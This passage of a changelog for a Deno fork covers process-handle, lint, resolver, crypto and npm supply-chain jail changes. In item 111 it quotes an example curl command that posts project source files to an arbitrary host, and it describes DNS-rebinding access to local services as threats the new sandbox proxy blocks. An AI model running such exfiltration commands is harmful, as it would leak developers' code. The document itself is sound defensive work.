     check instead of 1 s of idle. Under `denext start` with a 2 s burst every
     15 s, every other trim came 5 s late. Only a trim that runs is recorded now
     (`record_trim`); a skipped check still disarms the idle period, runs no GC
     and reads only `/proc/self/statm`. Tests:
     `a_skipped_check_does_not_delay_the_next_trim` (scheduler) and
     `a_skipped_check_leaves_the_spacing_to_the_last_trim` (poll wrapper, fake
     RSS); both fail on rc.5.

     Soak (rc.5 release CLI, `DENO_IDLE_TRIM_TRACE=1`, one throwaway
     `debian:bookworm-slim` container per scenario on biscuits, 1-2 CPUs each):
     no scenario trimmed more than once per 10 s, and no idle scenario trimmed
     again after its first trim without RSS growth.

     | scenario                                                                       | trims (after the first)       | RSS start / max / end (MB)             | p99 on / off (ms)                  |
     | ------------------------------------------------------------------------------ | ----------------------------- | -------------------------------------- | ---------------------------------- |
     | idle `Deno.serve`, 10 min                                                      | 1 (0)                         | 60 / 60 / 60                           | -                                  |
     | `setInterval` 900 ms / 1.1 s / 5 s / 30 s                                      | 0 / 1 / 1 / 1 (0)             | 60-61 / 60-67 / 60-67                  | timer lag p99 2.2 / 2.2 / 2.2 / 14 |
     | 200k FinalizationRegistry + WeakRef, then idle                                 | 2 (1, after the warm-up load) | 74 / 112 / 72                          | -                                  |
     | same, each finalizer batch schedules a timer that makes new registered garbage | 2 (1)                         | 74 / 111 / 65                          | -                                  |
     | 2 s burst every 15 s, 20 min                                                   | 81 (80: one per burst)        | 60 / 87 / 65 (off: 62 / 103 / 91)      | 24.1 / 29.0                        |
     | 2 s burst every 60 s, 20 min                                                   | 20 (19: one per burst)        | 60 / 87 / 82 (off: 61 / 102 / 77)      | 49.8 / 49.5                        |
     | 1 request every 1.5 s, 10 min                                                  | 1 (0: growth under 16 MB)     | 60 / 71 / 71 (off: 62 / 73 / 72)       | 2.66 / 2.72                        |
     | `examples/hello` under `denext start`, 2 s burst every 15 s, 10 min            | 41 (40: one per burst)        | 217 / 279 / 181 (off: 218 / 353 / 261) | 17.4 / 17.3                        |

105. **`fix(process)`: a Windows child inherits only its own handles**
     (`fix/windows-spawn-handle-inheritance`, CLI and runtime;
     `runtime/subprocess_windows/src/process.rs`, `lib.rs`, `process_stdio.rs`,
     `ext/process/lib.rs`). Every Windows spawn (`Deno.Command`,
     `node:child_process`, so Workers, `deno test --parallel`, sidecars and edge
     functions too) called `CreateProcessW` with `bInheritHandles = TRUE` and no
     handle list, while the child's pipe ends were inheritable from their
     creation until after the spawn. A child spawned at the same moment on
     another thread inherited them, and a long-lived one kept the other spawn's
     stdout write end open, so that spawn's `.output()` (or `execFile` callback)
     waited for the unrelated process to exit: on a Windows host, `cmd /c echo`
     stalled 45 s, the life of the concurrent long-lived children (stock Deno
     too).
     - **`PROC_THREAD_ATTRIBUTE_HANDLE_LIST`** (`STARTUPINFOEXW`): the child
       inherits exactly its CRT stdio slots (stdin, stdout, stderr, the extra
       `stdio` pipes) and the handles it is given by value, which
       `Command::inherit_handle` now lists: the npm state file
       (`DENO_DONT_USE_INTERNAL_NODE_COMPAT_STATE_FD`) and the IPC pipe
       (`NODE_CHANNEL_FD`). With nothing to list, `bInheritHandles` is `FALSE`.
     - **The child's pipe ends are created non-inheritable**; the spawn's own
       inheritable duplicates exist only around `CreateProcessW`.
     - **The duplicates are closed on every return path**: a failed
       `CreateProcessW` used to leak them, inheritable, for good.

     A program spawned through Rust's `std::process::Command` in the same
     process still inherits every inheritable handle; it gets the narrower
     window above.

     Test: `commandConcurrentSpawnsDoNotLeakPipes`
     (`tests/unit/command_test.ts`, Windows only, with
     `tests/testdata/workers/concurrent_spawn_worker.js`): two Workers keep
     spawning `ping` children that live 45 s while three Workers each run 60
     `cmd /c echo` spawns, two through `Deno.Command` and one through
     `node:child_process`; the slowest must finish within 15 s (45.5 s in all
     three before the fix).

106. **`feat(lint)`: type-aware lint rules through a pinned tsgolint**
     (`feat/tsgolint-type-aware-lint`, for runtime `3.0.0-rc.5`; CLI only:
     `cli/tools/lint/tsgolint.rs`, `cli/tools/lint/tsgolint_pin.json`,
     `cli/tools/lint/linter.rs`, `cli/tools/lint/mod.rs`,
     `cli/tools/lint/rules/mod.rs`, `cli/args/mod.rs`, `libs/cli_parser`,
     `libs/config`, `cli/schemas`, `.github/denext-runtime`). Adapted from
     [denoland/deno#35584](https://github.com/denoland/deno/pull/35584) (closed
     unmerged), the user's decision of 2026-10-22 for the Deno 3.0 scope.
     `deno lint --type-aware` (or `"lint": { "typeAware": true }` in the root
     config; `--no-type-aware` overrides it) also runs typescript-eslint's
     type-aware rules (`no-floating-promises`, `no-misused-promises`,
     `await-thenable`, ...) through
     [tsgolint](https://github.com/oxc-project/tsgolint) 7.0.2004, the Go binary
     built on typescript-go that oxlint uses. Off by default.
     - **How it runs**: `deno lint` stays the host. tsgolint's headless protocol
       (v2) gets every TypeScript/JavaScript file of a workspace member batch in
       one request (it builds one program per `tsconfig.json`, and an inferred
       ESNext/bundler/strict one for files with none); its diagnostics come back
       through deno_lint's external-linter callback, so `// deno-lint-ignore`,
       `ban-unused-ignore` and the pretty, compact and JSON reporters treat them
       like any other rule's (each links to
       `https://typescript-eslint.io/rules/<rule>`). The incremental cache is
       off while type-aware rules run (a file's type errors depend on its
       imports). Ranges are tsgolint's UTF-8 offsets into the BOM-stripped text;
       if a `--fix` pass rewrote the file, its type-aware diagnostics are placed
       at the start of the file with a note to lint again (deno_lint drops a
       diagnostic without a range).
     - **Rules**: upstream's 14 defaults (`await-thenable`, `no-base-to-string`,
       `no-duplicate-type-constituents`, `no-floating-promises`,
       `no-for-in-array`, `no-implied-eval`, `no-misused-promises`,
       `no-redundant-type-constituents`, `no-unnecessary-type-assertion`,
       `only-throw-error`, `prefer-promise-reject-errors`,
       `restrict-plus-operands`, `restrict-template-expressions`,
       `unbound-method`); `lint.rules.include` adds any of the other 45 tsgolint
       implements, `lint.rules.exclude` removes one. tsgolint's `require-await`
       is left out: the name is deno_lint's. All 59 names are known rule codes
       even with type-aware linting off (an ignore directive for one is not an
       unknown code), and are in `cli/schemas/lint-rules.v1.json`.
     - **The binary** (never upstream's npm-on-first-use): pinned in
       `tsgolint_pin.json` per platform by the npm tarball's integrity (sha512)
       and the binary's sha256. Looked up as `DENO_TSGOLINT_BIN` (used as is),
       then `tsgolint/` beside the `deno` executable (what the CLI archive
       ships; also through a symlink), then denext's toolchain cache
       (`<DENO_DIR>/denext-deno/<version>/<target>/tsgolint/`), then
       `<DENO_DIR>/dl/tsgolint-7.0.2004/<platform>/`, downloaded once from the
       pinned tarball and checked against both pins. Every candidate but the
       override must hash to the pinned sha256 (checked on each run), so a
       cached copy works offline and a changed one is not run. When none is
       found and the download fails, `deno lint` fails and names the fixes
       (`denext toolchain install`, `DENO_TSGOLINT_BIN`, `--no-type-aware`):
       type-aware rules that were asked for are never dropped silently. Bump
       with
       `python3 -I .github/denext-runtime/fetch_tsgolint.py --pin
       <version>`
       (downloads all six tarballs and records both hashes).
     - **Release archives**: `fetch_tsgolint.py` verifies the target's build and
       `assemble_cli.sh` ships it as `tsgolint/` (`tsgolint[.exe]`, `LICENSE`
       (MIT), `tsgolint.json`) next to `typescript-check/`; `BUILD_INFO.json`
       has `tsgolint`, and `manifest.json` lists
       `cli.targets.<target>.tsgolint: { version, sha256, tree_sha256 }`
       (`manifest.py`, recomputed from the zip like `typescript_lsp`).
       `cli_smoke.sh` lints a floating promise with `--type-aware` from an empty
       `DENO_DIR` with no reachable registry.
     - Not yet: the LSP (`deno lsp` shows no type-aware diagnostics), stdin
       (`deno lint -` warns and skips them), rule options, tsgolint's own fixes
       (`--fix`), and Deno's compiler options / import map: tsgolint resolves
       with its own `tsconfig.json` discovery, so `jsr:`/`npm:`/remote imports
       are untyped to it (upstream's open follow-up; the headless protocol has
       no tsconfig field).

     Tests: spec `lint/type_aware` (a rule firing in pretty and `--json` output,
     off by default, `lint.typeAware` and `--no-type-aware`,
     `lint.rules.exclude`, `deno-lint-ignore` with and without the flag, a
     missing override and a failed download each a clear error);
     `cli/tools/lint/tsgolint.rs` (pin coverage, rule lists, frame parsing,
     ranges against the linted text, both pins on a tarball, the cached binary
     reused offline and refused once changed, the local lookup order);
     `lint_type_aware` (`libs/cli_parser`);
     `test_lint_type_aware_must_be_a_boolean` and
     `test_root_member_lint_combinations` (`libs/config`);
     `.github/denext-runtime/manifest_test.py` (`tsgolint` recorded, refused
     when it disagrees with BUILD_INFO.json or is missing). The harness fetches
     the pinned binary into `target/tsgolint-<version>/` for a spec env value of
     `${TSGOLINT_BIN}` (`tests/util/lib/lib.rs`, `tests/specs/mod.rs`).

107. **`fix(resolver)`: the workspace's synthetic import map across Windows
     drives** (`fix/cross-drive-import-map`, for runtime `3.0.0-rc.5`, CLI only;
     `libs/resolver/synthetic_import_map.rs`, `libs/resolver/workspace.rs`). The
     general fix behind item 96. The workspace layers every non-root config
     (workspace members, `links` packages, auto-linked config folders) into the
     root's import map as a scope, writing paths relative to the root config's
     directory with `Url::make_relative`
     (`import_map::ext::create_synthetic_import_map`, import_map 0.25.0).
     `make_relative` knows nothing of drives: from `file:///C:/root/` it spells
     `file:///D:/x` as `../D:/x`, which resolves to `file:///C:/D:/x`. Every
     rewritten value, the member's scope key and each rewritten scope key broke
     that way. Item 96 covered a child on another drive; a member on the root's
     drive mapping a module on another drive still failed:
     `%TEMP%\mono\deno.json` = `{"workspace":["./web"]}`, `web\deno.json` =
     `{"imports":{"lib":"file:///Q:/lib/mod.ts"}}`, and `deno run web\main.ts`
     importing `"lib"` gave `Import 'file:///C:/Q:/lib/mod.ts' failed` (stock
     2.9.7, rc.3). A child on a UNC share (another host) panicked on the crate's
     `unwrap()`.

     The function now lives in `libs/resolver/synthetic_import_map.rs`, one code
     path for every child (item 96's wrapper is gone). A path is written
     relative to the root's directory only when the relative form resolves back
     to the same URL: never across drives (letters compared without regard to
     case), schemes or hosts, and not where `make_relative`'s answer doesn't
     round-trip (`c:` against `C:`). Otherwise the absolute URL is written. On
     one drive the output is byte for byte the crate's.

     Tests: `libs/resolver/synthetic_import_map.rs`
     (`same_output_as_the_crate_on_one_drive`,
     `a_member_value_on_another_drive_stays_absolute`,
     `a_member_on_another_drive_is_scoped_absolutely`,
     `a_root_on_another_drive_than_its_member`,
     `drive_letters_in_another_case_are_one_drive`, `a_member_on_a_unc_share`,
     `relative_only_where_it_round_trips`, `windows_drives`; with `C:/` / `D:/`
     URLs, run on every OS; 5 of them fail against the crate's function), and on
     Windows `workspace_import_map_across_drives`
     (`tests/integration/run_tests.rs`: a `subst` drive holding a member's
     mapped module, a `links` package and an auto-linked config folder).

108. **`feat(npm)`: jail follow-ups: per-package host lists, download caches,
     exception-only objects, workspace members** (`feat/jail-followups`, CLI
     only; `libs/config/deno_json/mod.rs`, `cli/supply_chain/jail.rs`,
     `cli/schemas/config-file.v1.json`). Four follow-ups to items 83 and 103.
     - **A host list per package.** `jailScripts.packages.<name>.net` takes,
       besides `true` / `false`, the hosts the package's scripts may reach:
       `"net": ["registry.npmjs.org", "github.com"]` (`host` or `host:port`). It
       is enforced as the declared download hosts are (item 83): the OS sandbox
       allows the network (it can't tell hosts apart), and every `deno` in the
       jail (the `node` shim, `.bin` wrappers, a script's own `deno run -A`)
       gets `--allow-net=<hosts>`. A program that isn't Deno (`curl`) can reach
       any host, as with `true` (until item 111, which routes every program
       through an allow-listing proxy). The list is the narrower grant, so it
       wins over `jailScripts.net: true` and replaces the hosts the package
       declares; it applies under `paranoid` too (it is the project's setting,
       not one the package grants itself). An empty list, an empty host, or one
       with a scheme, path, `@`, `?`, `#` or whitespace is a config error
       (`false` means no network).
     - **Download caches outside node_modules** (puppeteer's
       `PUPPETEER_CACHE_DIR`, playwright's `PLAYWRIGHT_BROWSERS_PATH`, cypress's
       `CYPRESS_CACHE_FOLDER`). By default such a download lands in the jail's
       scratch HOME and is removed with it, so the browser is missing at run
       time. The way to keep it is explicit, per package: list the directory in
       `write` and pass the variable in `env`, with the variable set in the
       environment of the install and of the app:
       `"puppeteer": { "net": ["storage.googleapis.com"], "env": ["PUPPETEER_CACHE_DIR"], "write": ["~/.cache/puppeteer"] }`.
       Two changes make that work: a `write` path starting with `~` (`~/...`,
       not `~user`) is the user's home directory, resolved when the jail runs
       (dropped when there is no home, never widened), so a checked-in deno.json
       needn't name one user's home; and a `write` directory is created when
       missing before the jail starts. Without that a first install failed:
       Landlock opens each writable root (a missing one made the sandbox setup
       fail) and Seatbelt matches real paths, which `canonicalize` only knows
       for an existing directory. Persisting these directories by default
       whenever a package gets the network was rejected: the caches hold
       executables that other projects run outside any jail, so a default grant
       would let one compromised package with network access plant a browser
       binary every other project then runs. Granting the write per package
       keeps it visible in the reviewed deno.json.
     - **An object that only lists exceptions doesn't ask for the jail.**
       `"jailScripts": { "packages": { ... } }` configures the default jail
       (item 103) instead of counting as `jail-scripts=true`, so where the OS
       can't confine (Windows) it no longer prints the "other programs are not
       confined" warning to a project that only listed exceptions, and it no
       longer outvotes `jail-scripts=false` from another source. An object with
       `net`, or one without `packages` (`{}`), still asks for the jail as
       before.
     - **Workspace members: root only, as before, now pinned.** `supplyChain` is
       read from the workspace root's deno.json alone, like `allowScripts`: the
       approvals and the jail's exceptions are about the one node_modules the
       root installs, and a member that could merge its own settings could
       loosen the root's (`jailScripts: false`, `advisoryCheck: "off"`). A
       member's `supplyChain` is ignored with the existing warning
       (`"supplyChain" field can only be specified in the workspace root
       deno.json file.`).
       Relative `write` paths are resolved against the root deno.json's
       directory.

     Tests: `npm/supply_chain_jail` (`per_package_net_hosts`: the listed host
     reached, another refused; `download_cache_persists`: a simulated browser
     download into a missing `PUPPETEER_CACHE_DIR` under the project, kept after
     the install), `test_to_supply_chain_config` (`libs/config/deno_json`: host
     lists and their errors, `~` paths, an exceptions-only object),
     `test_supply_chain_root_only` (`libs/config/workspace`: a member's
     `supplyChain` reported and not merged), `package_net` and `package_write`
     (`cli/supply_chain/jail.rs`).

109. **`feat(ext/node)`: `module.register()` asynchronous customization hooks**
     (`feat/module-register-async-hooks`; `ext/node/polyfills/01_require.js`,
     `libs/node_shim/lib.rs`). The user's decision of 2026-10-22 (decision 6,
     for denext 5.0). `register()` from `node:module` was a stub that returned
     `undefined`, so ts-node / tsx ESM loaders, APM agents (OpenTelemetry's
     instrumentation through import-in-the-middle), Yarn PnP and module mocks
     that install their hooks with it silently did nothing. Upstream has no PR;
     Node itself now recommends `registerHooks()` (which this fork already has)
     and has deprecated `register()`, but the ecosystem still calls it.
     - **How it runs.** As in Node, the hooks run off the main thread: the first
       `register(specifier, parentURL, { data, transferList })` starts a
       `node:worker_threads` worker that imports each hooks module, awaits its
       `initialize(data)` (`register()` returns what it returned; `data` and
       `transferList`, e.g. a `MessagePort`, are transferred), and serves
       `resolve` / `load` requests. The loading thread posts each request and
       blocks in `Atomics.wait` until the worker answers. Several `register()`
       calls chain last-registered first; `nextResolve` / `nextLoad` (with or
       without a context, merged like Node's), `shortCircuit`
       (`ERR_LOADER_CHAIN_INCOMPLETE` when a hook neither calls next nor short
       circuits), `format` (`module` / `commonjs` / `json` / `wasm` / `builtin`)
       and `source` overrides (string, `ArrayBuffer`, typed array) behave like
       Node's. A value thrown in a hook is rethrown on the loading thread (an
       error keeps its `name`, `message`, `stack` and `code`), and
       `process.exit()` in a hook ends the process. The hooks modules see
       `workerData` as `null`, not the worker's channel.
     - **`Module.register`.** The static is exposed again, as in Node.
       denoland/deno#34868 had hidden it because Playwright and tsx probe it and
       then wait for their loader's `initialize` handshake, which the stub never
       answered; with this implementation they get it, so they take their
       `register()` path instead of falling back.
     - **Where they apply.** To what `registerHooks()` hooks see on the ESM
       side: `import`, `import()` and an ES main module's load, in the user's
       code and in npm packages. As in Node, they do not apply to `require()`.
       In-thread `registerHooks()` hooks always run first, whichever was
       registered first, and the off-thread chain runs after them.
     - **Deno's resolver.** The end of the off-thread chain is not a copy of
       Node's resolver: when the last hook calls `nextResolve()` / `nextLoad()`,
       the worker asks the loading thread, which runs the same terminal step
       `registerHooks()` uses (Deno's resolver: import maps, `npm:` / `jsr:`
       specifiers, package exports; Deno's loader for the source). So hooks see
       the specifier as written and Deno's resolved URL from `nextResolve()`,
       and a hook can still return any URL (a custom scheme, a `data:` URL) with
       `shortCircuit: true`.
     - **Permissions.** The hooks worker runs with the process's permissions,
       and the default load reads files on the loading thread as before: a hook
       that reads a file needs `--allow-read` for it like any other code, and
       returning `source` for a URL never grants access to a file.
     - **Node's CLI flags.** The Node CLI shim (`node` in tasks and
       `child_process` spawning `process.execPath`) used to drop `--require`,
       `--import` and `--experimental-loader` / `--loader`. They now become
       `--preload` modules in Node's order (`--require`, then the loaders, then
       `--import`): a `--require` module is loaded through a generated `data:`
       module with a `require` rooted at the working directory (so `-r pkg`
       finds a package or the project's self-reference, as in Node), and a
       loader through one that calls
       `register(<loader>,
       pathToFileURL("./"))`, which is what Node does
       for `--experimental-loader`. An absolute `--require` path is required
       from itself and an absolute loader is registered as its own file URL, so
       neither reads the working directory (a deleted one does not stop them, as
       in Node). In a command string run through a shell
       (`child_process.exec()`), a `--require` value that still holds a `$VAR` /
       `${VAR}` reference becomes Deno's own `--require`, since the shell
       expands it after the translation and could not inside a `data:` URL; such
       a module runs after the loaders and the `--import` modules.
     - **Not done:** a hooks chain that never settles blocks the loading thread
       (Node resolves `import()` asynchronously, so other imports go on, and
       detects the stall and exits with code 13); a CommonJS main module is
       loaded by the CommonJS loader, out of the hooks' reach (Node's `--import`
       routes it through the ESM loader); as with `registerHooks()`, the ESM
       load hooks are not called for `node:` builtins; the main module is
       resolved before preloads run, so a hook can't resolve a bare main
       specifier; hooks registered on the main thread do not reach
       `worker_threads` workers (each thread registers its own); the hooks
       worker's own module loading is not customized by earlier `register()`
       calls; `--input-type=module --eval` is still run as a script by the CLI
       shim; an error from an ESM resolve or load hook reaches the importer as a
       message (its `code` is lost), as for `registerHooks()`.

     Tests: spec `node/module_register` (`resolve_remap`, a resolve hook that
     remaps a bare specifier; `load_transform`, a load hook that rewrites
     source, and `require()` left alone; `chained`, two registers with
     `initialize` data and return values, LIFO; `short_circuit`, a virtual
     module and `ERR_LOADER_CHAIN_INCOMPLETE`; `with_register_hooks`, sync hooks
     first; `initialize_ports`, a transferred `MessagePort`;
     `permission_denied`, a hook reading outside `--allow-read=.`;
     `node_cli_flags`, `--experimental-loader` / `--import` / `--require` from
     `child_process`); `test_run_script_with_preloads`,
     `test_experimental_loader_registers_through_preload` and
     `test_eval_with_preloads`, `test_absolute_preloads_do_not_read_the_cwd` and
     `test_shell_command_require_with_variable` (`libs/node_shim`); node_compat
     `parallel/test-cwd-enoent-preload.js` and `parallel/test-preload-worker.js`
     (a deleted working directory and a `-r "${VAR}"` in a shell command);
     `[node/module register]
     runs the hooks module's initialize` and
     `Module.register and
     Module.registerHooks are exposed`
     (`tests/unit_node/module_test.ts`); node_compat
     `module-hooks/test-async-loader-hooks-register-with-ports.mjs`,
     `-initialize-in-sequence.mjs`, `-process-exit-top-level.mjs` and
     `test-module-hooks-resolve-require-resolve-loaded-with-source.js` enabled,
     and `parallel/test-preload-self-referential.js` now passing for real (it
     passed while `-r` was dropped); the other `test-async-loader-hooks-*`
     entries say what each still needs. `-never-settling-race-{cjs,esm}.mjs` and
     `-no-leak-internals.mjs`, which passed only because the shim dropped
     `--experimental-loader`, are now ignored with the reason.

110. **`fix(deps)`: RUSTSEC-2026-0387 — crypto-bigint 0.7.6, and the EC crates
     off crypto-bigint 0.5.5** (`Cargo.toml`, `Cargo.lock`, `ext/crypto`,
     `ext/node_crypto`, `cli/tools/publish/provenance.rs`,
     `runtime/ops/desktop_update`). crypto-bigint before 0.7.6 could branch on
     secret data in subtraction (`borrowing_sub`), zero counting, `div_rem` and
     Montgomery multiplication, compare `UintRef`s limb by limb, and branch on
     invertibility in `BoxedMontyForm::invert`; no 0.5.x release is patched. The
     0.7 line moves to 0.7.6 (with ctutils 0.4.5, hybrid-array 0.4.15, typenum
     1.20.1; item 42's ctutils 0.4.4, RUSTSEC-2026-0385, was the first half of
     the same fixes). crypto-bigint 0.5.5 is gone from `Cargo.lock`, so
     `cargo audit` reports no RUSTSEC-2026-0387 and nothing ignores it: the EC
     stack moves from elliptic-curve 0.13.8 / ecdsa 0.16.9 / p256 0.13.2 / p384
     0.13.0 / p521 0.13.3 / k256 0.13.3 / p224 0.13.2 / primeorder 0.13.6 to
     elliptic-curve 0.14.1, ecdsa 0.17.0, p256 / p384 / p521 / k256 / primeorder
     0.14.0 and p224 `=0.14.0-rc.15` (no 0.14.0 final yet; pinned exactly), with
     pkcs8 0.11.0, spki 0.8.1, sec1 0.8.1, der 0.8.2, signature 3.0.0, rfc6979
     0.6.0 and rand_core 0.10 under them. ed448-goldilocks moves from
     0.14.0-pre.10 (built for elliptic-curve 0.14.0-rc.28, which does not
     compile against 0.14.1) to `=0.14.0-pre.15` and ed448 from 0.5.0-rc.5 to
     0.5.0 (rc.5 does not build against pkcs8 0.11.0); X448 / Ed448 keep their
     RFC 7748 / RFC 8032 vectors. Coexistence: rsa 0.9 (pkcs8 0.10, spki 0.7,
     der 0.7, const-oid 0.9, signature 2, digest / sha2 0.10, rand 0.8) stays,
     side by side with the 0.14 line; the boundary is bytes. The ASN.1 plumbing
     shared with RSA/DSA (PKCS#8 / SPKI / SEC1 documents, PEM labels, OIDs)
     keeps the old codecs (sec1 0.7 stays as that codec in `ext/node_crypto`;
     the OIDs elliptic-curve now types as const-oid 0.10 are spelled as
     const-oid 0.9 constants), and a curve key is built from, or written to, the
     same DER / SEC1 / raw bytes by the 0.14 crates. Message digests stay sha1 /
     sha2 0.10: ECDSA takes the digest bytes. Keys are generated with
     elliptic-curve's `Generate` (the OS RNG; rand 0.8's `thread_rng` is not a
     rand_core 0.10 RNG). elliptic-curve 0.14 dropped JWK, so
     `ext/node_crypto/jwk_ec.rs` ports 0.13.8's `JwkEcKey` (same member order,
     same parse rules and errors, same `d`-matches-`x`/`y` check). ecdsa 0.17
     accepts a prehash shorter than half the field, which 0.16 refused; the old
     rule is kept (`ecdsa_prehash_len_ok`), so P-384 with SHA-1 (and, in
     `node:crypto`, P-521 with a digest of 32 bytes or less) still fails to sign
     and never verifies. One observable difference: P-521 ECDSA signatures were
     randomized (p521 0.13's `sign_prehash` drew the nonce from `OsRng`) and are
     now RFC 6979 deterministic, like every other curve; both verify everywhere.
     The laufey pin (`LAUFEY_SHA`, the `laufey` git dependency of
     `cli/rt_desktop/Cargo.toml`) moves from `a0f2c26` to `f5325d4` (laufey
     `development-denext`), which takes the Linux passkey host
     (`webauthn-linux`, its own lockfile) off crypto-bigint 0.5.5 for the same
     advisory: libwebauthn and snow from Brainwires forks on p256 0.14; the
     laufey crate and API 49 are unchanged. Tests: known-answer vectors produced
     independently (Python `cryptography` / OpenSSL 3.6) and run before and
     after the migration — `ext/node_crypto/ec_golden_tests.rs` (P-224, P-256,
     P-384, P-521, secp256k1: PKCS#8 / SEC1 / SPKI DER, raw and compressed
     points, JWK, DER and P1363 RFC 6979 signatures with every digest, the RFC
     6979 A.2.5 vector, ECDH secrets and public keys) and
     `ext/crypto/ec_golden_tests.rs` (WebCrypto import / export in every format,
     sign / verify with every hash, ECDH `deriveBits`, generated PKCS#8 layout),
     plus `signature_format_known_answer`
     (`runtime/ops/desktop_update/manifest.rs`) and `p256_spki_pem_known_answer`
     (`cli/tools/publish/provenance.rs`);
     `cargo test -p deno_crypto -p deno_node_crypto -p deno_crypto_provider`.

111. **`fix(npm)`: a jailed script's host list binds every program, and
     per-package write roots** (`feat/jail-net-proxy`, CLI only;
     `cli/supply_chain/jail_proxy.rs`, `cli/supply_chain/jail.rs`,
     `cli/supply_chain/sandbox_macos.rs`, `cli/supply_chain/sandbox_linux.rs`,
     `libs/config/deno_json/mod.rs`, `cli/schemas/config-file.v1.json`).
     Follow-ups to items 83, 103 and 108 from denext's supply-chain audit of
     4.8.
     - **A host list now holds every program, not only Deno (High).** A
       package's declared download host (node-pre-gyp's `binary.host`, item 83)
       or a per-package host list (item 108) turned the OS sandbox's network on
       for the whole script, and only `deno` processes were held to the hosts:
       `sh -c "curl https://anywhere --data @src/..."` reached any host, with
       the project's source readable. Now the jail host (the unsandboxed
       `deno install`) starts an allow-listing HTTP proxy on `127.0.0.1` for
       each such script: `CONNECT host:port` (HTTPS, any TCP tunnel) and
       absolute-URI `http://` requests (forwarded in origin form with
       `Connection: close`) to an allowed `host` / `host:port` go through,
       anything else gets `403`. Matching is `--allow-net`'s: a host without a
       port allows every port, names are exact (no subdomains), compared after
       IDNA and lower-casing with a trailing dot dropped, and an IP literal in
       any URL form (`0x7f.1`, `[0:0::1]`) matches only the same address, never
       a name that resolves to it. The proxy resolves names itself, so the
       script needs no DNS. Its environment points every client there:
       `HTTP(S)_PROXY`, `ALL_PROXY` (both cases), `npm_config_proxy`,
       `npm_config_https_proxy`, `GLOBAL_AGENT_HTTP(S)_PROXY`, and
       `NODE_USE_ENV_PROXY=1` (Node's `http` / `https`, Deno's included); the
       installer's `NO_PROXY` and npm proxy keys are dropped. Every `deno` in
       the jail may connect to the proxy besides the hosts. When the installer's
       environment names an `http://` proxy (`HTTPS_PROXY`, `HTTP_PROXY`,
       `ALL_PROXY`, minus `NO_PROXY`), allowed connections go through it, with
       the URL's credentials as `Proxy-Authorization`; another scheme
       (`socks5://`) is not used, with a warning.
     - **What the OS allows.** macOS: the Seatbelt profile denies IP traffic and
       then allows `(remote ip "localhost:<port>")` only, with no Unix sockets
       (the resolver's included) and no `com.apple.dnssd.service` lookup. Linux
       6.7+ (Landlock ABI 4): `LANDLOCK_ACCESS_NET_CONNECT_TCP` with one rule
       for the proxy's port, and seccomp allowing only TCP stream sockets
       (protocol 0 or TCP: no UDP, so no DNS or other datagrams, and no SCTP or
       MPTCP, which Landlock's port rules don't cover) and refusing `sendto` /
       `sendmsg` / `sendmmsg` with `MSG_FASTOPEN` (a Fast Open send connects
       without `connect(2)`). Landlock matches ports, not addresses: a
       connection to another machine on the proxy's port number (random, per
       script) is not refused by the kernel (item 124 adds a network namespace
       of the script's own where unprivileged user namespaces are allowed, so no
       such route exists). Windows: no OS confinement, as before; the proxy and
       its environment still apply to the clients that honor them, and Deno is
       clamped.
     - **No listening either.** A script without the whole network can't accept
       connections from outside, which would hand data to whoever connects in:
       Seatbelt's `(deny network-inbound (local ip))` (also without any network,
       where macOS had let a script listen and serve), and Landlock's
       `LANDLOCK_ACCESS_NET_BIND_TCP` with no rule (without network, Linux
       refuses IP sockets already).
     - **Linux before 6.7 (no Landlock network rules).** Hosts the package
       declares for itself, and any host list under `paranoid`, get no network
       (fail closed, with a warning naming the hosts): the package granted
       itself that, or the project asked for every gate to fail closed, and most
       such packages fall back to building from source. A host list the
       project's deno.json grants keeps today's behavior: the network stays open
       at the OS level, the proxy and Deno clamp still apply, and a warning
       (once per install) says other programs can reach any host. That is the
       project's own reviewed decision, and failing it would break installs on
       every LTS distribution kernel older than 6.7 with no workaround short of
       `net: true`.
     - **`net: false` wins (Medium).** A package's `"net": false` now also drops
       the hosts it declares for itself and wins over
       `jailScripts.net:
       true` (the global switch had won over it).
     - **Per-package write roots (Medium).** A jailed script writes only beneath
       its own package's folder (plus its `write` paths and the scratch HOME /
       TMPDIR), no longer anywhere in node_modules (item 83): one package's
       script can't rewrite another package's files, which run later outside the
       jail. A package that writes a sibling directory (Prisma's
       `node_modules/.prisma`) lists it in `write`.
     - **Executables in a `~` cache (Low).** After a script whose package has
       `~` write paths (item 108) finishes, files it left there with an execute
       or set-id bit, and symlinks to such files, are removed and the script
       fails, unless the package's entry has `"executables": true` (a browser
       download: `"puppeteer": { ..., "executables": true }`). Such caches are
       shared with other projects, which run what they hold outside any jail.
       Refusing the creation itself isn't possible: neither Seatbelt nor
       Landlock can tell file modes apart per path, and seccomp can't see paths.
       The sweep looks at files whose inode changed since the script started
       (`ctime`, which a script can't set back) and removes rather than clears
       the bit, so a hard link to a file elsewhere leaves that file alone. (A
       process the script left running could create one after the sweep; since
       item 124 the script's whole process group is ended before the sweep
       runs.)
     - **A listed name may not lead to this machine (High).** The proxy allows a
       host by NAME and resolves it itself, so a package's declared host
       (node-pre-gyp's `binary.host`) or a listed name whose DNS an attacker
       controls (rebinding) could resolve to loopback and reach local services
       from a jailed script. Now a name is refused (`403`) when ANY address it
       resolves to is internal (one is enough: a rebinding answer mixes them):
       IPv4 `0/8` (unspecified), loopback `127/8`, RFC 1918 private (`10/8`,
       `172.16/12`, `192.168/16`), link-local `169.254/16` (cloud metadata's
       `169.254.169.254`) and CGNAT `100.64/10`, also inside IPv6 (IPv4-mapped
       `::ffff:a.b.c.d`, IPv4-compatible `::a.b.c.d`, NAT64 `64:ff9b::/96`);
       IPv6 `::`, `::1`, unique-local `fc00::/7`, link-local `fe80::/10` and the
       retired site-local `fec0::/10`. The proxy then connects to exactly the
       addresses it checked and never resolves the name again (no check-then-use
       gap). Through the installer's own upstream proxy, which may itself be on
       a private address, the target is checked the same way and the upstream is
       asked for the checked address (`CONNECT 93.184.215.14:443`, an absolute
       `http://<address>/` URL with the client's `Host` header), not the name,
       so it can't resolve it differently; an upstream that only allows names,
       or a network where only the upstream resolves names, refuses such
       scripts. Exempt: an allow-list entry that is the IP literal itself
       (`127.0.0.1:4545`, `[::1]`), the name `localhost`, and the names in a
       package's deno.json host list when its entry sets `"allowPrivate": true`
       (a mirror on the local network; it needs a `net` host list, a config
       error otherwise, and never covers the hosts a package declares for
       itself). A name that doesn't resolve is a `502`. Correction (item 124):
       until then the IP-literal and `localhost` exemptions DID apply to the
       hosts a package declares for itself (only `allowPrivate` didn't), so a
       declared `http://127.0.0.1:5432` or `http://localhost:2375` reached the
       service; since item 124 a declared host gets no exemption in any form.
